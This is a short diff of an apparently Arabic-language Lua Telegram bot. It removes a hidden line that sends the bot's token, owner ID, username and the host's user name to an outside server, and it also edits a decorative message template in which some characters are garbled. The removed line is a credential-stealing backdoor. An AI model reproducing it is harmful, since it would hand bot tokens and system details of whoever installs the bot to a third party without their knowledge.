@@ -73,7 +73,6 @@ token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 UserName = database:get(id_server..":SUDO:USERNAME")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('https://gsovdkdb.ml/api/frawn.php/?token='..token..'&SUDO='..SUDO..'&UserName='..UserName..'&install='..install..'&botUserName='..botUserName)
 print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("BANDA", "w")  
 file:write([[
@@ -16108,7 +16107,7 @@ Msᴀɢ ~ #msgs
 𝒔𝒕𝒂𓂅 #stast 𓍯
 𝐮𝐬𝐞𝐫𓂅 #username 𓍯
 𝒎????𝒆𓂅 #msgs 𓍯
-𝐢𝐝 𓂅 #id 𓍯
+??𝐝 𓂅 #id 𓍯
 𓂅 𝗖𝗛 - 「@source_frawn」 ◍
 ]],
 [[
